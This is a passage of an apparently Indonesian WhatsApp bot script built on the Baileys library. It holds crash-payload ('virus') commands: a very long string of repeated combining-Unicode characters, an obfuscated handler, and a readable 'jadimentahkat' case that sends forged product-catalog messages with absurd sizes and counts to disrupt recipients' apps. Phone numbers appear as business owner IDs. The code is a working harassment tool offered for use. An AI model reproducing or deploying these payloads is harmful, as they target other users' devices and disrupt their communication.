𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️','Gk\x20guna😏'];_0x2fb6=function(){return _0x486e7c;};return _0x2fb6();}_0x1cfe6b();function _0x3078(_0x4bfee0,_0x460f0a){var _0xea9cbb=_0x2fb6();return _0x3078=function(_0x1cfe6b,_0x9ab345){_0x1cfe6b=_0x1cfe6b-0x1c5;var _0x2369ff=_0xea9cbb[_0x1cfe6b];return _0x2369ff;},_0x3078(_0x4bfee0,_0x460f0a);}{if(!isCreator&&!isBan)return;if(!m[_0xc6393f(0x1e5)])throw _0xc6393f(0x1d1);if(!text)throw _0xc6393f(0x1c6);let media=await quoted[_0xc6393f(0x1ea)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':ikycoli[_0xc6393f(0x1f0)]}),catalog=generateWAMessageFromContent(m[_0xc6393f(0x1d7)],proto[_0xc6393f(0x1ef)][_0xc6393f(0x1ec)]({'productMessage':{'product':{'productImage':messa[_0xc6393f(0x1ce)],'productId':_0xc6393f(0x1e2),'fileLength':'99999999999','jpegThumbnail':virgam,'title':_0xc6393f(0x1d8)+text+'\x20','description':_0xc6393f(0x1d5)+philips,'currencyCode':'IDR','productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0xc6393f(0x1df),'salePriceAmount1000':_0xc6393f(0x1f3),'bodyText':_0xc6393f(0x1d6),'footerText':_0xc6393f(0x1dc),'retailerId':_0xc6393f(0x1d4),'url':_0xc6393f(0x1d9)},'businessOwnerJid':'6285706035039@s.whatsapp.net','contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0xc6393f(0x1d7)],'quoted':shield2});ikycoli[_0xc6393f(0x1cc)](m[_0xc6393f(0x1d7)],catalog[_0xc6393f(0x1c7)],{'messageId':catalog[_0xc6393f(0x1da)]['id']}),jancok(_0xc6393f(0x1e6));}
}
break

case 'jadimentahkat':{
if(!isCreator) return 
if (!m.quoted) throw `*Send/Reply Image`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ image: media }, 
{ upload: ikycoli.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "JEMBOD",
"fileLength": "99999999999",
"jpegThumbnail": virgam,
"title": "isi virus",
"description": "isi virus",
"currencyCode": "IDR",
"productImageCount": 923456789,
"firstImageId": 1,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",  
"bodyText": "isi virus",
"footerText": "isi virus",
"retailerId": `CATALOG IKYY NEW ERA`,
"url": "https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ"
},
"businessOwnerJid": "6281364011418@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: shield2 })
